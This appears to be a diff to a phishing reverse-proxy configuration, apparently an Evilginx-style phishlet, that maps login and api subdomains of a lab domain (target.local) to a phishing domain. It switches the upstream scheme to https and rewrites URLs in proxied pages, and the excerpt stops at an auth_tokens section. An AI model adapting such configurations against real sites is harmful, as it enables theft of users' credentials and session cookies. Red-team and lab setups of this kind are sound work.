@@ -13,22 +13,22 @@ proxy_hosts:
     orig_sub:  login
     domain:    target.local
     is_landing: true
-    upstream_scheme: http
+    upstream_scheme: https
 
   - phish_sub: api
     orig_sub:  api
     domain:    target.local
-    upstream_scheme: http
+    upstream_scheme: https
 
 # auto_filter is true by default on both hosts — it rewrites:
 #   login.target.local → login.phish.local
 #   api.target.local   → api.phish.local
 # This handles the cross-origin fetch URL in the login page's JS.
-# Explicit sub_filters are only needed for scheme correction (http → https).
+# Explicit sub_filter rewrites absolute URLs with the scheme.
 sub_filters:
   - hostname: login.target.local
     mime_types: [text/html, text/javascript, application/javascript]
-    search:     'http://(login|api)\.target\.local'
+    search:     'https://(login|api)\.target\.local'
     replace:    'https://$1.{domain}'
 
 auth_tokens:
